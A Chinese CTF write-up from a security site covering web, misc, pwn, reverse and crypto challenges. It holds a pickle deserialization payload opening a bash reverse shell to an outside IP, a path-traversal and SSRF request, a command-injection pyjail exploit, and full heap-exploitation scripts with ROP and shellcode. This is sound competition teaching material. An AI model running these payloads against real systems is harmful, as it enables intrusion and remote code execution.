# 长城杯 wp

阅读量 **226768**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-09-26 10:30:38

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01be1a8e3904e92317.jpg)

## Web

###  ez_python

ez_python 利用?pic读源码。  
读源码之后可以了解到是在cookie[‘user’]处 pickle.loads  
并且ban了Reduce。  
自己构造下opcode，反弹shell即可。

    
    
    import base64
    data=b'''(cos
    system
    S'bash -c "bash -i >& /dev/tcp/82.156.18.214/8888 0>&1"'
    o.'''
    print(base64.b64encode(data))
    

![](https://p4.ssl.qhimg.com/t01c4346d8b91dd93a7.png)

###  java_url

题目给出了一个下载路由，优先找web.xml

    
    
    GET /download?filename=../../../../WEB-INF/web.xml HTTP/1.1
    

之后找testURL 去下载class  
反编译发现在url处可以SSRF。

![](https://p1.ssl.qhimg.com/t019b2f9220641636e7.jpg)

绕过一下

    
    
    GET /testURL?url=%0afile:///flag
    

得到flag

## Misc

###  签到

hex->base64

###  你这flag保熟吗

binwalk 2个图片  
发现其中有个password.xls  
和一个Hint  
通过hint我们可以猜到是希尔伯特曲线  
解密即可。

    
    
    char = []
    temp = []
    new = []
    n=8
    pos_=[-1,-1]
    dir_=0
    result = ''
    count = 0
    f = open("a.txt",'r')
    for i in range(256):
        temp.append(f.readline())
    for i in range(256):
        temp[i] = temp[i].replace('\n','')
    
    count = 0
    for i in range(256):
        t=''
        for j in range(255,-1,-1):
            t=t+temp[j][i]
        new.append(t)
        count = count +1
    count = 0
    for i in range(256):
        t=''
        for j in range(255,-1,-1):
            t=t+new[j][i]
        char.append(t)
        count = count +1
    
    result = result + char[255][255]
    def move(direction):
        global result
        global pos_
        if direction==0:
            pos_[1]=pos_[1]-1
        if direction==1:
            pos_[0]=pos_[0]+1
        if direction==2:
            pos_[1]=pos_[1]+1
        if direction==3:
            pos_[0]=pos_[0]-1
        print((pos_[0]+2**n-1),(pos_[1]+2**n-1))
        result = result + char[pos_[0]][pos_[1]]
    def hilL(n):
        global pos_
        global dir_
        if n==0:
            pass
        if n>0:
            dir_ = (dir_ +1)%4
            hilR(n-1)
            move(dir_)
    
            dir_ = (dir_-1)%4
            hilL(n-1)
            move(dir_)
    
            hilL(n-1)
            dir_ = (dir_ -1 )%4
            move(dir_)
    
            hilR(n-1)
            dir_ = (dir_+1)%4
    def hilR(n):
        global pos_
        global dir_
        if n==0:
            pass
        if n>0:
            dir_ = (dir_ - 1 ) % 4
            hilL(n - 1)
            move(dir_)
    
            dir_ = (dir_ + 1) % 4
            hilR(n - 1)
            move(dir_)
    
            hilR(n - 1)
            dir_ = (dir_ + 1) % 4
            move(dir_)
    
            hilL(n - 1)
            dir_ = (dir_ - 1) % 4
    hilR(n)
    print(result)
    print()
    

不断base64后得到压缩包密码  
得到压缩包密码后 发现是brainfuck  
并没有把flag输出出来，而是存到了内存里。

    
    
    锘?include<stdio.h>
    #include<string.h>
    using namespace std;
    struct pair
    {
        unsigned int a;    //[
        unsigned int b; //]
    };
    pair loop_tbl[1000];
    unsigned int tbl_size=0;
    unsigned int stack[1000],stack_ptr=0;
    void push_pair(unsigned int a,unsigned int b)
    {
        pair x;
        x.a=a;
        x.b=b;
        loop_tbl[tbl_size++]=x;
    }
    bool ParseLoop(unsigned char *opcode,unsigned int len)
    {
        for(int i=0;i<len;i++)
        {
            if(opcode[i]=='[')
                stack[stack_ptr++]=i;
            if(opcode[i]==']')
            {
                if(stack_ptr==0)
                    return false;
                push_pair(stack[--stack_ptr],i);
            }
        }
        if(stack_ptr!=0)
            return false;
        return true;
    }
    unsigned int FindAddress(unsigned int pc,unsigned char chr)
    {
        if(chr=='[')
        {
            for(int i=0;i<tbl_size;i++)
                if(loop_tbl[i].a==pc)
                    return loop_tbl[i].b;
            return -1;
        }
        else if(chr==']')
        {
            for(int i=0;i<tbl_size;i++)
                if(loop_tbl[i].b==pc)
                    return loop_tbl[i].a;
            return -1;
        }
        else
            return -1;
    }
    bool Fuck2C(unsigned char *opcode,unsigned char *mem,unsigned int maxsize)
    {
        unsigned long long times=0;
        unsigned int pc=0,ptr=0,bk=0;
        FILE *fp=fopen("log.txt","w");
        while(opcode[pc]!=0)
        {
            times++;
            for(int j=0;j<bk;j++)
                fprintf(fp,"\t");
            if(opcode[pc]=='>')
            {
                fprintf(fp,"ptr++;\n");
                pc+=1;
            }
            else if(opcode[pc]=='<')
            {
                fprintf(fp,"ptr--;\n");
                pc+=1;
            }
            else if(opcode[pc]=='+')
            {
                if(ptr>maxsize)
                    return false;
                fprintf(fp,"mem[ptr]++;\n");
                pc+=1;
            }
            else if(opcode[pc]=='-')
            {
                if(ptr>maxsize)
                    return false;
                fprintf(fp,"mem[ptr]--;\n");
                pc+=1;
            }
            else if(opcode[pc]=='.')
            {
                if(ptr>maxsize)
                    return false;
                fprintf(fp,"putchar(mem[ptr]);\n");
                pc+=1;
            }
            else if(opcode[pc]==',')
            {
                if(ptr>maxsize)
                    return false;
                fprintf(fp,"mem[ptr]=getchar();\n");
                pc+=1;
            }
            else if(opcode[pc]=='[')
            {
                unsigned int t=FindAddress(pc,opcode[pc]);
                if(t<0 || ptr>maxsize)
                    return false;
                fprintf(fp,"while(mem[ptr]){\n");
                bk+=1;
                pc+=1;
            }
            else if(opcode[pc]==']')
            {
                unsigned int t=FindAddress(pc,opcode[pc]);
                if(t<0 || ptr>maxsize)
                    return false;
                bk-=1;
                fprintf(fp,"}\n",t+1);
                pc+=1;
            }
            else 
                return false;
    
        }
        fclose(fp);
        printf("\nloop times:%lld\n",times);
        return true;
    }
    bool RunFuckVMCore(unsigned char *opcode,unsigned char *mem,unsigned int maxsize)
    {
        unsigned long long times=0;
        unsigned int pc=0,ptr=0;
        unsigned int max_ptr=0;
        while(opcode[pc]!=0)
        {
            times++;
            if(max_ptr<ptr)
                max_ptr=ptr;
            if(opcode[pc]=='>')
            {
                ptr++;
                pc+=1;
            }
            else if(opcode[pc]=='<')
            {
                ptr--;
                pc+=1;
            }
            else if(opcode[pc]=='+')
            {
                if(ptr>maxsize)
                    return false;
                mem[ptr]++;
                pc+=1;
            }
            else if(opcode[pc]=='-')
            {
                if(ptr>maxsize)
                    return false;
                mem[ptr]--;
                pc+=1;
            }
            else if(opcode[pc]=='.')
            {
                if(ptr>maxsize)
                    return false;
                putchar((char)mem[ptr]);
                pc+=1;
            }
            else if(opcode[pc]==',')
            {
                if(ptr>maxsize)
                    return false;
                mem[ptr]=getchar();
                pc+=1;
            }
            else if(opcode[pc]=='[')
            {
                unsigned int t=FindAddress(pc,opcode[pc]);
                if(t<0 || ptr>maxsize)
                    return false;
                if(!mem[ptr])
                    pc=t+1;
                else 
                    pc+=1;
            }
            else if(opcode[pc]==']')
            {
                unsigned int t=FindAddress(pc,opcode[pc]);
                if(t<0 || ptr>maxsize)
                    return false;
                if(mem[ptr])
                    pc=t+1;
                else
                    pc+=1;
            }
            else 
                return false;
        }
        puts("");
        for(int i=0;i<50;i++)
            printf("%c",mem[i]);
        puts("");
        printf("\nloop times:%lld\nmax pointer:%d\n",times,max_ptr);
        return true;
    }
    unsigned char memory[25565];
    unsigned char op[]=">+++++++++[<+++++++++++++>-]>+++[<+++++++++++++++++++++++++++++++++++++>-]>++[<+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>-]>++++[<+++++++++++++++++++++++++++++>-]>+++[<+++++++++++++++++++++++++++++++++++++++++>-]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>>++++++[<+++++++++++++++++++>-]>++[<+++++++++++++++++++++++++++++++++++++++++>-]>+++++++++++[<+++++++++++>-]>++[<+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>-]>+++++++[<+++++++++++++++>-]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>>+++++[<+++++++++++++++++++>-]>++++++++[<+++++++++++>-]>++++++[<+++++++++++++++++>-]>+++++++[<+++++++++++++++>-]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>>++[<+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>-]>+++++[<+++++++++++++++++++>-]>+++++++[<+++++++>-]>++++++++[<+++++++++>-]>+++++[<+++++++++++++++++++>-]>++++[<+++++++++++++>-]>+++++[<+++++++++++++++++++>-]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>>++++++[<++++++++>-]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>>+++++++[<+++++++++++++++++>-]>++[<+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>-]>+++++++[<+++++++++++++++>-]>+++++++++[<+++++++++++++>-]>++++++[<+++++++++++++++++>-]>+++[<+++++++++++>-]>+++++[<+++++++++++++++++++>-]>++++++++++[<++++++++++++>-]>++++++[<+++++++++++++++++>-]>+++++++[<+++++++++++++++>-]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>>++[<+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>-]>+++++[<+++++++++++++++++++++++++>-]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.>>++++++[<+++++++++++++++++++>-]<.>>++++++[<+++++++++++++++++++>-]<.>>+++[<+++++++++++++++++++++++++++++++++++++>-]<.>>++++++[<+++++++++++++++++++>-]<.>";
    bool RunVM(unsigned char *strs)
    {
        tbl_size=0;
        stack_ptr=0;
        if(!ParseLoop(op,strlen((char*)op)))
            return false;
        if(!RunFuckVMCore(strs,memory,25565))
            return false;
        return true;
    }
    int main()
    {
        RunVM(op);
        return 0;
    }
    

搜一下uzot开头的字符串特征  
得到埃特巴什码

![](https://p0.ssl.qhimg.com/t01f168e0b03183e56f.png)

然后再大小写对应一下。

###  pyjail3

![](https://p1.ssl.qhimg.com/t01dde5d2e573ff194b.png)

观察源码，发现在calc部分中，exec中是直接字符串拼接，  
且里面的的`import {module}`中module未经任何校验，  
导致可以RCE（大概是非预期解？）  
令`module="os;print(os.system("ls /"))"`即可。

    
    
    from pwn import *
    
    r = remote("47.104.175.110",41234)
    r.sendline("2")
    poc = '''os;print(os.system("ls /"))'''
    r.sendline(poc)
    r.interactive()
    

![](https://p4.ssl.qhimg.com/t016e8a1484c766d8be.png)

## Pwn

###  K1ng_in_h3Ap_I

off by one  
uaf  
造成chunk overlap以后，申请相应大小的chunk让unsorted
bin的fd落到fastbin的fd上，利用printf地址后三个字节计算出stdout地址，partial
overwrite将fastbin指向stdout上方，然后向stdout写入相应数据泄露libc基址。  
接下来直接利用uaf改fastbin的fd，申请到malloc_hook前面，在realloc_hook写one_gadget，在malloc_hook写`realloc+12`调整栈桢打one_gadget即可

    
    
    from pwn import*
    context(os='linux', arch='amd64', log_level='debug')
    r = remote('47.104.175.110',20066)
    #r = process('./pwn')
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    
    def add(idx, sz):
    
        r.sendlineafter('>> ', str(1))
        r.sendlineafter('input index:', str(idx))
    
        r.sendlineafter('input size:', str(sz))
    
    def delete(idx):
        r.sendlineafter('>> ', str(2))
        r.sendlineafter('input index:', str(idx))
    
    def edit(idx, ct):
    
        r.sendlineafter('>> ', str(3))
    
        r.sendlineafter('input index:', str(idx))
    
        r.sendafter('input context:', ct)
    
    
    def magic():
        r.sendlineafter('>> ', str(666))
    
    magic()
    r.recvuntil('0x')
    addr = int(r.recv(6), 16)
    stdout = (addr&0xffff)-0x1f0-0x43
    
    
    add(0, 0x18)
    add(1, 0x18)
    add(2, 0x68)
    add(3, 0x18)
    add(4, 0x18)
    add(8, 0x68)
    edit(0, 'A'*0x18+p8(0x91))
    delete(1)
    delete(2)
    add(1, 0x18)
    edit(2, p16(stdout)+'\n')
    add(5, 0x68)
    add(6, 0x68)
    edit(6, '\x00'*0x23+p64(0)*2+p64(0xfbad1800)+p64(0)*3+'\x00'+'\n')
    libc.address = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00'))-0x3c5600
    print hex(libc.address)
    
    malloc_hook = libc.symbols['__malloc_hook']
    realloc = libc.symbols['realloc']
    one = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
    ogg = libc.address+one[1]
    
    delete(8)
    edit(8, p64(malloc_hook-0x23)+'\n')
    add(7, 0x68)
    add(8, 0x68)
    edit(8, 'A'*0xb+p64(ogg)+p64(realloc+12)+'\n')
    
    r.sendline('1')
    sleep(0.5)
    r.sendline('9')
    sleep(0.5)
    r.sendline('50')
    
    r.interactive()
    

###  K1ng_in_h3Ap_II

uaf，开了沙箱  
伪造size位，uaf改tcache fd指向fake size，拿到fake chunk，再释放掉，得到一块unsorted
bin，填充数据以后show拿到基址  
同样uaf，利用tcache向free_hook写入`setcontext+53`，并利用两块chunk在相应偏移处布置数据，从而向fakersp读入数据并进行rop，执行mprotect后orw读出flag

    
    
    from pwn import*
    context(os='linux', arch='amd64', log_level='debug')
    #r = process('./pwn')
    r = remote('47.104.175.110',61608)
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    
    def add(idx, sz):
        r.sendlineafter('>> ', str(1))
        r.sendlineafter('input index:', str(idx))
        r.sendlineafter('input size:', str(sz))
    
    def delete(idx):
        r.sendlineafter('>> ', str(2))
        r.sendlineafter('input index:', str(idx))
    
    def edit(idx, ct):
        r.sendlineafter('>> ', str(3))
        r.sendlineafter('input index:', str(idx))
        r.sendafter('input context:', ct)
    
    def show(idx):
        r.sendlineafter('>> ', str(4))
        r.sendlineafter('input index:', str(idx))
    
    for i in range(13):
        add(i, 0x58)
    add(14, 0x58)#last one
    edit(0, p64(0)+p64(0x471))
    
    delete(1)
    delete(2)
    edit(2, b'\x80')
    add(1, 0x58)
    add(2, 0x58)
    delete(2)
    edit(0, 'A'*0x10)
    show(0)
    r.recvuntil('A'*0x10)
    libc.address = u64(r.recv(6).ljust(8, '\x00'))-96-0x10-libc.symbols['__malloc_hook']
    print 'libc_base ===> ', hex(libc.address)
    free_hook = libc.symbols['__free_hook']
    setcontext = libc.symbols['setcontext']+53
    syscall = libc.symbols['syscall']+23
    
    
    edit(0, p64(0)+p64(0x471))
    
    delete(1)
    delete(3)
    edit(3, p64(free_hook))
    
    fake_rsp = free_hook&0xfffffffffffff000
    edit(9, p64(0)+p64(0)+p64(fake_rsp)+p64(0)*2+p64(0x1000)+
        p64(0)*2+p64(fake_rsp)+p64(syscall))
    add(13, 0x58)
    add(14, 0x58)
    edit(14, p64(setcontext))
    #gdb.attach(r)
    delete(8)
    prdi_ret = libc.search(asm("pop rdi\nret")).next()
    prsi_ret = libc.search(asm("pop rsi\nret")).next()
    prdx_ret = libc.search(asm("pop rdx\nret")).next()
    prax_ret = libc.search(asm("pop rax\nret")).next()
    jmp_rsp = libc.search(asm("jmp rsp")).next()
    mprotect_addr = libc.sym['mprotect']
    
    payload = p64(prdi_ret)+p64(fake_rsp)
    payload += p64(prsi_ret)+p64(0x1000)
    payload += p64(prdx_ret)+p64(7)
    payload += p64(prax_ret)+p64(10)
    payload += p64(syscall) #mprotect(fake_rsp,0x1000,7)
    payload += p64(jmp_rsp)
    payload += asm(shellcraft.open('flag'))
    payload += asm(shellcraft.read(3,fake_rsp+0x300,0x30))
    payload += asm(shellcraft.write(1,fake_rsp+0x300,0x30))
    sleep(0.5)
    r.send(payload)
    
    r.interactive()
    

## Reverse

###  JUST_cmp_re

进入就能看到flag{ ** ** ** ** ** ** ** _**_************** }  
然后随便点了点函数 发现有一个函数中有移位操作。虽然完全没有调用。但是也不懂是啥意思，就和上面的flag做一下操作了。

    
    
    a=[0,   0,   0,   0,   0,  55,   7,  10,  55,  10,  8,  10,   6,   6,  11,  56,   7,  10,  59,   8,
       56,  14,  15,  59,  58,  10,  11,   6,   9,   7,
       59,  55,  13,  15,   7,  56,  15,   0
    ]
    flag='flag{********************************}'
    result=''
    for i in range(0,len(flag)):
        result+=chr(ord(flag[i])+a[i])
    
    print(result)
    

###  Funny_js

quickjs 2020-01-19的版本，dump出字节码

![](https://p3.ssl.qhimg.com/t01a512eb3ddd9a002a.png)

然后编译对应版本quickjs，使用qjsc生成一个模板，然后替换字节码

![](https://p2.ssl.qhimg.com/t01d8df5d3900b1699a.png)

稍微修改一下quickjs的源码，添加一个dump的函数到执行字节码的函数之前

![](https://p2.ssl.qhimg.com/t0178a13594d52d65a5.png)

![](https://p5.ssl.qhimg.com/t01e0cb0a9ec898328e.png)

然后再编译，生成elf文件，执行就会输出opcode的可读形式

![](https://p3.ssl.qhimg.com/t018207d2b1ad62d820.png)

然后逆向发现是一个rc4算法，密钥是2021quickjs_happygame，然后密文是sn数组里的值，直接从字节码中取出

![](https://p0.ssl.qhimg.com/t01ecaccd717d0d1e2e.png)

RC4后还要一个异或，直接RC4解密，异或39即可得到flag

![](https://p0.ssl.qhimg.com/t01c65721f3da99e655.png)

## Crypto

###  baby_rsa

第一部分 把小的 m 和 v 爆破一下就可以了

第二部分 直接在 给的第三个数上 解就可以

    
    
    c = 15808773921165746378224649554032774095198531782455904169552223303513940968292896814159288417499220739875833754573943607047855256739976161598599903932981169979509871591999964856806929597805904134099901826858367778386342376768508031554802249075072366710038889306268806744179086648684738023073458982906066972340414398928411147970593935244077925448732772473619783079328351522269170879807064111318871074291073581343039389561175391039766936376267875184581643335916049461784753341115227515163545709454746272514827000601853735356551495685229995637483506735448900656885365353434308639412035003119516693303377081576975540948311
    e = 65537
    
    for v in range(300):
        for m in range(300):
            p = pow(v, (m + 1)) - pow((v + 1), m)
            if 1022 < p.bit_length() < 1026 and isPrime(p) and \
                    b'flag{' in long_to_bytes(pow(c, inverse(e, p - 1), p)):
                print(long_to_bytes(pow(c, inverse(e, p - 1), p)).decode(), end='')
                break
    
    c = 40625981017250262945230548450738951725566520252163410124565622126754739693681271649127104109038164852787767296403697462475459670540845822150397639923013223102912674748402427501588018866490878394678482061561521253365550029075565507988232729032055298992792712574569704846075514624824654127691743944112075703814043622599530496100713378696761879982542679917631570451072107893348792817321652593471794974227183476732980623835483991067080345184978482191342430627490398516912714451984152960348899589532751919272583098764118161056078536781341750142553197082925070730178092561314400518151019955104989790911460357848366016263083
    n = 39796272592331896400626784951713239526857273168732133046667572399622660330587881579319314094557011554851873068389016629085963086136116425352535902598378739
    phi = 190 * 192 * 627382 * 1720754738477317127758682285465031939891059835873975157555031327070111123628789833299433549669619325160679719355338187877758311485785197492710490
    print(long_to_bytes(pow(c, inverse(e, phi), n)).decode())
    # flag{8102c552-3d78-4a42-b659-0c96ef827f05}
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Retr_0** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/253659](/post/id/253659)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __1赞

 __收藏

![](https://p0.ssl.qhimg.com/t010457258f753577cd.png) Retr_0

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

